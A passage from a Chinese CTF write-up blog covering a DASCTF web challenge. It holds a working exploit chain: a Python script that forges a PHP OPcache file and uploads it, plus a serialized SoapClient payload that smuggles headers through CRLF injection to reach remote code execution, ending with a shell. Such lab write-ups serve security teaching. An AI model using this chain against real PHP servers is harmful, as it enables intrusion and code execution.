+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">url = <span class="string">&quot;http://12943d13-4210-4cf7-8219-8aa4761aef73.node4.buuoj.cn:81/?LuckyE=filectime&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timec</span>():</span><br><span class="line">    pattern = <span class="string">r&quot;\d&#123;10&#125;&quot;</span>  <span class="comment">#匹配十位数字</span></span><br><span class="line">    timeres = requests.get(url=url)</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&quot;int\((\d&#123;10&#125;)\)&quot;</span>,timeres.text)<span class="comment">#从响应包中提取到时间戳信息</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ten_digit_number = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(ten_digit_number)</span><br><span class="line">        <span class="keyword">return</span> ten_digit_number  <span class="comment">#返回时间戳</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;dame&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_string_into_pairs</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(input_string) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;输入字符串的长度必须是偶数&quot;</span>)</span><br><span class="line">    pairs = [input_string[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(input_string), <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> pairs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">totime</span>(<span class="params">time</span>):</span><br><span class="line">    b = split_string_into_pairs(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">int</span>(time))&#125;</span>&quot;</span>)</span><br><span class="line">    b.pop(<span class="number">0</span>)</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b)):</span><br><span class="line">        s += b[-<span class="number">1</span>]</span><br><span class="line">        b.pop(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changetime</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;index.php.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        binary_data = file.read()</span><br><span class="line">        <span class="comment"># 将二进制数据转换为十六进制字符串</span></span><br><span class="line">        hex_data = binascii.hexlify(binary_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        new_data = hex_data[<span class="number">0</span>:<span class="number">128</span>]+totime(timec())+hex_data[<span class="number">136</span>:]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;index.php.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="built_in">bytes</span>.fromhex(new_data))</span><br><span class="line">changetime()</span><br><span class="line">sys_id = hashlib.md5(<span class="string">&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\002&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(sys_id)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tar_file</span>():</span><br><span class="line">    tar_filename = <span class="string">&#x27;exp.tar&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(tar_filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">        directory_info = tarfile.TarInfo(name=<span class="string">f&#x27;<span class="subst">&#123;sys_id&#125;</span>/var/www/html&#x27;</span>)</span><br><span class="line">        directory_info.<span class="built_in">type</span> = tarfile.DIRTYPE</span><br><span class="line">        directory_info.mode = <span class="number">0o777</span></span><br><span class="line">        tar.addfile(directory_info)</span><br><span class="line">        tar.add(<span class="string">&#x27;index.php.bin&#x27;</span>, arcname=<span class="string">f&#x27;<span class="subst">&#123;sys_id&#125;</span>/var/www/html/index.php.bin&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;exp.tar&quot;</span>,<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>,<span class="string">&quot;rb&quot;</span>).read(),<span class="string">&quot;application/x-tar&quot;</span>)&#125;</span><br><span class="line">    res  = requests.post(url=<span class="string">&quot;http://12943d13-4210-4cf7-8219-8aa4761aef73.node4.buuoj.cn:81/siranai.php&quot;</span>,files=file)</span><br><span class="line">    <span class="built_in">print</span>(res.request.headers)</span><br><span class="line">    <span class="keyword">return</span> res.request</span><br><span class="line">tar_file()</span><br><span class="line">request_content = upload()</span><br><span class="line">upload_body = <span class="built_in">str</span>(request_content.body).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)</span><br><span class="line">content_length = request_content.headers[<span class="string">&#x27;Content-Length&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(content_length)</span><br><span class="line"><span class="built_in">print</span>(upload_body)</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/22.png" class>
+
+<p>将生成的请求体数据封装在 SoapClient 内置类里，序列化</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$koi</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$postdata</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/siranai.php&quot;</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;Enterpr1se\r\n&quot;</span> . <span class="string">&quot;Cookie: PHPSESSION=16aaab9fb\r\nContent-Type: multipart/form-data; boundary=&quot;</span> . <span class="title function_ invoke__">substr</span>(<span class="variable">$postdata</span>, <span class="number">2</span>, <span class="number">32</span>) . <span class="string">&quot;\r\nConnection: keep-alive\r\nAccept: */*\r\nContent-Length: 10416&quot;</span> . <span class="string">&quot;\r\n\r\n&quot;</span> . <span class="variable">$postdata</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/siranai.php&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (SoapFault <span class="variable">$e</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">siroha</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;koi=[<span class="string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;[<span class="variable">$a</span>,<span class="string">&quot;nnnnn&quot;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
+
+<p>这里调用 SoapClient 对象的不存在的nnnnn方法，会触发call方法。burp发包</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/23.png" class>
+
+<p>这里实际上已经覆盖掉了，页面回显发生变化，实际上就是直接运行了我们上传的opcode，还挺神奇的</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/24.png" class>
+
+<p>这就已经成功拿到shell了。</p>
+<h3 id="ezfastjson"><a href="#ezfastjson" class="headerlink" title="ezfastjson"></a>ezfastjson</h3><p>题目环境关了，本来挺想复现这个题的，期望后续环境能开。</p>
+<p>官方wp：<a target="_blank" rel="noopener" href="https://dxh3b3fqgc3.feishu.cn/docx/HkgmdV6Fgom3P0x0iUscKxYZnLd">https://dxh3b3fqgc3.feishu.cn/docx/HkgmdV6Fgom3P0x0iUscKxYZnLd</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://xilitter.github.io">XiLitter</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xilitter.github.io/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">https://xilitter.github.io/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xilitter.github.io" target="_blank">XiLitter</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="/img/art04.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="JDBC反序列化漏洞分析"><img class="cover" src="/img/art03.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">JDBC反序列化漏洞分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/" title="2022蓝帽杯Ez_gadget题目分析"><img class="cover" src="/img/art/a3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-30</div><div class="title">2022蓝帽杯Ez_gadget题目分析</div></div></a></div><div><a href="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/" title="2022安洵杯web"><img class="cover" src="/img/art/a8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-31</div><div class="title">2022安洵杯web</div></div></a></div><div><a href="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="2023极客巅峰babyurl-初识二次反序列化"><img class="cover" src="/img/art/a3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">2023极客巅峰babyurl-初识二次反序列化</div></div></a></div><div><a href="/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/" title="2022西湖论剑部分web复现"><img class="cover" src="/img/art/a8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-04</div><div class="title">2022西湖论剑部分web复现</div></div></a></div><div><a href="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="0ctf-2021 buggyLoader题目复现"><img class="cover" src="/img/art/a2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-02</div><div class="title">0ctf-2021 buggyLoader题目复现</div></div></a></div><div><a href="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="2023阿里云CTF-ezbean题目复现与分析"><img class="cover" src="/img/art/a3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-28</div><div class="title">2023阿里云CTF-ezbean题目复现与分析</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">XiLitter</div><div class="author-info__description">且视他人之疑目如盏盏鬼火，大胆去走你的夜路。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiLitter"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/XiLitter" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/3336741183@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">换博客主题了，感觉还是这个主题更好看，而且功能也多，但是好多功能暂且没设置，以后再弄。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">0x02 题目复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#realrce"><span class="toc-number">2.1.</span> <span class="toc-text">realrce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EzPenetration"><span class="toc-number">2.2.</span> <span class="toc-text">EzPenetration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#single-php"><span class="toc-number">2.3.</span> <span class="toc-text">single_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezfastjson"><span class="toc-number">2.4.</span> <span class="toc-text">ezfastjson</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="DASCTF X 0psu3十一月挑战赛   WEB题目复现"><img src="/img/art04.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF X 0psu3十一月挑战赛   WEB题目复现"/></a><div class="content"><a class="title" href="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="DASCTF X 0psu3十一月挑战赛   WEB题目复现">DASCTF X 0psu3十一月挑战赛   WEB题目复现</a><time datetime="2023-12-06T03:42:39.000Z" title="发表于 2023-12-06 11:42:39">2023-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="JDBC反序列化漏洞分析"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JDBC反序列化漏洞分析"/></a><div class="content"><a class="title" href="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="JDBC反序列化漏洞分析">JDBC反序列化漏洞分析</a><time datetime="2023-11-10T08:44:29.000Z" title="发表于 2023-11-10 16:44:29">2023-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Nagini 打靶记录"><img src="/img/art/a7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nagini 打靶记录"/></a><div class="content"><a class="title" href="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Nagini 打靶记录">Nagini 打靶记录</a><time datetime="2023-11-08T14:03:45.000Z" title="发表于 2023-11-08 22:03:45">2023-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="0ctf-2021 buggyLoader题目复现"><img src="/img/art/a2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="0ctf-2021 buggyLoader题目复现"/></a><div class="content"><a class="title" href="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="0ctf-2021 buggyLoader题目复现">0ctf-2021 buggyLoader题目复现</a><time datetime="2023-11-02T12:34:36.000Z" title="发表于 2023-11-02 20:34:36">2023-11-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" title="thinkphp 5.1 rce流程分析"><img src="/img/art/a5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="thinkphp 5.1 rce流程分析"/></a><div class="content"><a class="title" href="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" title="thinkphp 5.1 rce流程分析">thinkphp 5.1 rce流程分析</a><time datetime="2023-10-30T09:15:14.000Z" title="发表于 2023-10-30 17:15:14">2023-10-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/art04.jpeg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By XiLitter</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>
